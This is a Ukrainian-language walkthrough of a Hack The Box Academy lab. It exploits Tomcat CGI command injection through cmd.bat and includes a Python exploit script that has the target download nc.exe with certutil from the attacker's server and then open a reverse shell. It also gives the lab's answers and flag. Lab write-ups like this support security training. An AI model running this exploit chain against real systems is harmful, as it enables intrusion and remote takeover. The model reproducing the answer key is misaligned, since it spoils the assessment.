Attacking Common Applications — Skills Assessment I (Attacking Tomcat CGI)
==========================================================================

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Attacking Common Applications - Skills Assessment I](https://academy.hackthebox.com/app/module/113/section/1097)
Ціль: `10.129.108.138`
Відповіді:
- Q1: `Tomcat`
- Q2: `8080`
- Q3: `9.0.0.M1`
- Q4 (flag.txt): `f55763d31a8f63ec935abd07aee5d3d0`

Ідея атаки
----------

На хості `10.129.108.138`:
- працює Windows із купою сервісів (FTP, IIS, RDP, WinRM);
- на порту `8080/tcp` запущено Apache Tomcat 9.0.0.M1;
- у веб‑додатку включений CGI, зокрема `cgi/cmd.bat`, який дає RCE через HTTP;
- ми завозимо `nc.exe` на хост і отримуємо reverse shell;
- з шелла читаємо `C:\Users\Administrator\Desktop\flag.txt`.

Крок 1 — Первинна мережна розвідка (nmap)
-----------------------------------------

На атакуючій машині:

```bash
nmap -p- -sC -sV --open --min-rate 1000 10.129.108.138
```

Ключові порти:

- `21/tcp open ftp Microsoft ftpd` + анонімний FTP з директорією `website_backup`
- `80/tcp open http Microsoft IIS httpd 10.0` (Freight Logistics, Inc)
- `3389/tcp open ms-wbt-server` (RDP)
- `5985/tcp open http Microsoft HTTPAPI httpd 2.0` (WinRM)
- `8000/tcp open http Jetty 9.4.42.v20210604`
- `8009/tcp open ajp13 Apache Jserv`
- `8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1`
  - `http-title: Apache Tomcat/9.0.0.M1`
  - `http-server-header: Apache-Coyote/1.1`

Висновки:

- Q1: вразливий застосунок – **Tomcat**;
- Q2: порт – `8080`;
- Q3: версія – `9.0.0.M1`.

Крок 2 — Перевірка Tomcat CGI (cmd.bat)
---------------------------------------

Перевіряємо наявність CGI:

```bash
curl "http://10.129.108.138:8080/cgi/cmd.bat"
```

Якщо CGI ввімкнений і `cmd.bat` стартує, можна передавати йому команди, напр.:

```bash
curl "http://10.129.108.138:8080/cgi/cmd.bat?dir"
curl "http://10.129.108.138:8080/cgi/cmd.bat?whoami"
```

Логіка:

- Tomcat запускає `cmd.bat` як CGI‑скрипт;
- все після `?` потрапляє як аргументи до `cmd.exe`;
- це дає нам HTTP‑RCE у контексті Tomcat/Windows користувача.

Крок 3 — Підготовка робочої директорії та nc.exe
------------------------------------------------

На атакуючій машині створюємо окрему папку:

```bash
mkdir ~/tomcat-cgi-rce
cd ~/tomcat-cgi-rce
```

Шукаємо `nc.exe` у системі:

```bash
find / -name "nc.exe" 2>/dev/null | head
```

Ти взяв один із варіантів:

```bash
cp /usr/share/sqlninja/apps/nc.exe .
```

У результаті в `~/tomcat-cgi-rce` лежить файл `nc.exe`, який будемо роздавати жертві через наш HTTP‑сервер.

Крок 4 — Піднімаємо свій HTTP‑сервер
------------------------------------

Запускаємо простий HTTP‑сервер Python на своєму Pwnbox:

```bash
sudo python3 -m http.server 8000
```

Якщо порт 80 вже зайнятий, використовуємо 8000 (як ти):

```text
Serving HTTP on 0.0.0.0 port 8000 ...
10.129.108.138 - - "GET /nc.exe HTTP/1.1" 200 -
```

Тепер:

- `http://10.10.14.103:8000/nc.exe` – доступно з цілі;
- цей URL використаємо в `certutil` для завантаження `nc.exe` на Windows‑хост.

Крок 5 — Готуємо простий експлойт‑скрипт (Tomcat CGI RCE)
---------------------------------------------------------

У `~/tomcat-cgi-rce` створюємо `nano tomcat_cgi_rce.py`:

```python
#!/usr/bin/env python3
import time
import requests

# ================== USER CONFIGURATION ================== #
target_host = '10.129.108.138'   # Victim IP (Tomcat host)
target_port = '8080'             # Tomcat HTTP port

attacker_ip = '10.10.14.103'     # твій HTB VPN IP (eu-academy-5)
attacker_http_port = '8000'      # порт HTTP-сервера з nc.exe
listener_port = '1234'           # порт nc listener'а
# ======================================================== #

# Payload 1: завантажити nc.exe через certutil
url1 = (
    f"http://{target_host}:{target_port}/cgi/cmd.bat?"
    f"&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+"
    f"http%3A%2F%2F{attacker_ip}%3A{attacker_http_port}%2Fnc.exe+nc.exe"
)

# Payload 2: запустити nc.exe для reverse shell
url2 = (
    f"http://{target_host}:{target_port}/cgi/cmd.bat?"
    f"&nc.exe+{attacker_ip}+{listener_port}+-e+cmd.exe"
)

print("[*] Sending payload to download nc.exe...")
r1 = requests.get(url1)
print(f"[+] URL1 Response Code: {r1.status_code}")

time.sleep(2)

print("[*] Sending payload to execute nc.exe for reverse shell...")
r2 = requests.get(url2)
print(f"[+] URL2 Response Code: {r2.status_code}")

print("[*] Exploit triggered. Check your Netcat listener.")
```

Перед запуском переконуємось, що `requests` встановлено:

```bash
pip3 install requests
```

Крок 6 — Готуємо Netcat listener
--------------------------------

У **іншому** терміналі запускаємо `nc`‑лістер:

```bash
nc -lvnp 1234
```

Це той порт, який ми вказали в `listener_port` у скрипті.  

Очікуємо вхідне зʼєднання з IP цілі.

Крок 7 — Тригеримо RCE через Tomcat CGI
---------------------------------------

У терміналі в `~/tomcat-cgi-rce`:

```bash
python3 tomcat_cgi_rce.py
```

Бачимо:

```text
[*] Sending payload to download nc.exe...
[+] URL1 Response Code: 200
[*] Sending payload to execute nc.exe for reverse shell...
[+] URL2 Response Code: 200
[*] Exploit triggered. Check your Netcat listener.
```

Коротко, що відбулось на цілі:

1. `cmd.bat` виконав `certutil -urlcache -split -f http://<attacker>:8000/nc.exe nc.exe` – закачав `nc.exe` у поточну директорію CGI.  
2. Потім `cmd.bat` виконав `nc.exe <attacker_ip> <listener_port> -e cmd.exe` – стартував reverse shell.  

Крок 8 — Отримуємо Windows shell
--------------------------------

У Netcat‑терміналі:

```text
Connection received on 10.129.108.138 49691
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
```

Шлях на старті (у тебе):

```text
C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi>
```

Далі:

```cmd
cd C:\Users\Administrator\Desktop
dir
```

Бачимо:

```text
09/30/2021  10:41 AM                32 flag.txt
```

Крок 9 — Читаємо flag.txt
-------------------------

У тому ж шеллі:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

Якщо команда була трохи крива (у тебе з двома `dir`/`type`), просто фінально:

```cmd
type flag.txt
```

Отримуємо:

```text
f55763d31a8f63ec935abd07aee5d3d0
```

Це й є відповідь на Q4.  

Відповіді
---------

- **Q1:** What vulnerable application is running? → `Tomcat`
- **Q2:** What port is this application running on? → `8080`
- **Q3:** What version of the application is in use? → `9.0.0.M1`
- **Q4:** Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop → `f55763d31a8f63ec935abd07aee5d3d0`

Що тут було вразливим
---------------------

- Включений CGI‑модуль у Tomcat із доступним `cmd.bat`, що дозволяє виконувати довільні системні команди через HTTP.  
- Відсутність обмежень на виклик `certutil` та завантаження зовнішніх бінарників (`nc.exe`) з інтернету.  
- Контекст виконання дозволяє доступ до профілю Administrator і читання файлів на його Desktop (`flag.txt`).  
